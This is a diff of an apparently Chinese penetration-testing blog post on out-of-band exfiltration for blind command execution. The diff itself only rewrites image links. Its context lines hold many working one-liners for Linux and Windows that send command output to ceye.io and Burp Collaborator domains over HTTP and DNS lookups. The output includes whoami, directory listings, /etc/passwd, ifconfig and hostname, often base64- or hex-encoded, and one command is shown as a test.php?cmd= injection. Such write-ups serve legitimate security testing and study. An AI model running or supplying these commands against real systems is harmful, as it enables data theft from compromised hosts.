@@ -26,7 +26,7 @@ tags: []
 
 **程序不进行详细的回显信息，而只是返回对或者错时，我们都可以叫它盲**。我们在做渗透测试的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，例如提交反馈表单，需要等管理员打开查看提交信息时才会触发，或者是盲注跨站，盲打 XSS 这种。再例如 SSRF，如果程序不进行回显任何信息，而只提示你输入的是否合法，那么也无法直接判断程序存在 SSRF 漏洞，我们可以叫盲 SSRF。再例如 XXE，引入外部文件时，如果程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在 XXE 漏洞，我们也可以叫盲 XXE。
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/001.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/001.png)
 
 **基本回显思路**
 ----------
@@ -83,9 +83,9 @@ curl http://ip.port.XXXXXX.ceye.io/`whoami`
 curl `whoami`.XXXXXX.ceye.io
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/002.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/002.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/003.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/003.png)
 
 **2.sed**
 
@@ -99,7 +99,7 @@ curl `whoami`.XXXXXX.ceye.io
 curl http://ip.port.XXXXXX.ceye.io/`ls -al|sed -n '2p'`
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/004.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/004.png)
 
 **使用base64传输**
 
@@ -111,11 +111,11 @@ curl http://ip.port.XXXXXX.ceye.io/`ls -al|sed -n '2p'`
 curl http://ip.port.XXXXXX.ceye.io/`ls -al|sed -n '2p'|base64`   
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/005.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/005.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/006.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/006.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/007.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/007.png)
 
 #### **DNS带外攻击**
 
@@ -129,11 +129,11 @@ curl http://ip.port.XXXXXX.ceye.io/`ls -al|sed -n '2p'|base64`
 ping `whoami`.ip.port.XXXXXXX.ceye.io
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/008.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/008.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/009.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/009.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/010.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/010.png)
 
 **说明使用DNS管道解析还是比较鸡肋的，只适合单条的短信息回显，有点作用。**
 
@@ -197,9 +197,9 @@ http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al |cut -c 3
 
 打开 collaborator client
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/011.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/011.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/012.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/012.png)
 
 利用远程命令执行，或直接在靶机上执行命令：意思是发送whoami信息回显至burp的二级域名地址，回显过来
 
@@ -215,15 +215,15 @@ http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al |cut -c 3
 curl `whoami`.wyyysg1fi9svq8zgf0g11dz80z6pue.burpcollaborator.net
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/013.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/013.png)
 
 **查看burp模块，DNS隧道解析结果**
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/014.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/014.png)
 
 **http隧道回显信息**
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/015.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/015.png)
 
 #### **2.第二种命令格式**
 
@@ -235,15 +235,15 @@ curl `whoami`.wyyysg1fi9svq8zgf0g11dz80z6pue.burpcollaborator.net
 curl http://n7vp17a6r01mzz87orpsa48z9qfh36.burpcollaborator.net/`whoami`
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/016.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/016.png)
 
 #### **DNS记录中无回显**
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/017.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/017.png)
 
 #### **http中有回显**
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/018.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/018.png)
 
 #### **3.第三种命令执行格式**
 
@@ -286,7 +286,7 @@ ping %whoami%.ip.port.ttq72fceob0yxwq9342c4yuo2f85wu.burpcollaborator.net
 wget --header="User-Agent: $(cat /etc/passwd | xargs echo–n)" http://6rych16irk3064ztjoo9ufasuj0do2.burpcollaborator.net
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/019.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/019.png)
 
 ####  **1.2 curl传输：curl也是一个利用思路，套路差不多，比较简单不再测试**
 
@@ -304,13 +304,13 @@ wget --header="User-Agent: $(cat /etc/passwd | xargs echo–n)" http://6rych16ir
 var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,"&\n")}1'); do var=$((var+1)) && nslookup $var.$i.402c35vpn9hpplp9ilj09pxx9ofe33.burpcollaborator.net; done
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/020.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/020.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/021.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/021.png)
 
 **每行记录，再base64解密**
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/022.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/022.png)
 
 拿到机器ifconfig命令执行记录，部分会乱码
 
@@ -324,13 +324,13 @@ var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,"&\n")}1'); do var=$(
 var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig $var.$b.itfjy788hafvu4q8xtf7naktrkxbpze.burpcollaborator.net; done
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/023.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/023.png)
 
 这种方式需要每条结果复制粘贴，比较麻烦，但回显结果还是准确的，可以看到ifconfig命令执行后的直接结果 
 
 > **十六进制转换字符：**<http://www.bejson.com/convert/ox2str>
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/024.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/024.png)
 
 #### **2.3 ICMP传输**
 
@@ -394,13 +394,13 @@ curl http://0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net/%USERNAME%
 curl http://0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net/%WinDir%
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/025.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/025.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/026.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/026.png)
 
 查看远程username名称结果为Butcher
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/027.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/027.png)
 
 #### **1.2 certutil利用**
 
@@ -416,13 +416,13 @@ curl http://0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net/%WinDir%
 ipconfig > temp && certutil -f -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && (for /f %i in (./temp3) do set /p=%i<nul >>temp4) || set /p pl=<temp4 && curl -H "User-Agent:%pl%" http://qysvrrmxvestl2c93ydg0u5p1g76vv.burpcollaborator.net && del temp*
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/028.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/028.png)
 
 **执行成功**
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/029.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/029.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/030.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/030.png)
 
 **Base64解码即可看到执行结果**
 
@@ -439,7 +439,7 @@ for /L %i in (1,1,10) do nslookup    //执行10次nslookup命令
 cmd /v /c "hostname > temp && certutil -f -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR=<temp3 && set FINAL=!MYVAR!.z00h57chzl8lln3fno9aydnspjv9jy.burpcollaborator.net && nslookup !FINAL!"
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/031.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/031.png)
 
 经过测试，回显只能执行hostname命令，没有办法通过写入对命令shell的循环来让其执行多次回显信息，失败。
 
@@ -455,13 +455,13 @@ cmd /v /c "hostname > temp && certutil -f -encode temp temp2 && findstr /L /V "C
 whoami > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.qf95nhvxs08z5nr9wk19ruzsqjw9ky.burpcollaborator.net';$j += 1; nslookup $fin }
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/032.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/032.png)
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/033.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/033.png)
 
 第二串字符
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/034.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/034.png)
 
 两个拼接起来
 
@@ -477,7 +477,7 @@ whoami > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-
 
 转后为信息是全的，可以全部一条条来，最后全部破解即可
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/035.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/035.png)
 
 #### **2.3 通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录**
 
@@ -492,7 +492,7 @@ win+r
 \\%USERNAME%.0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net
 ```
 
-<!-- img: /assets/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/036.png -->
+![](/images/posts/网安/奇淫巧计/带外攻击OOB（RCE无回显骚思路总结）/036.png)
 
 ### **3.ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）**
 
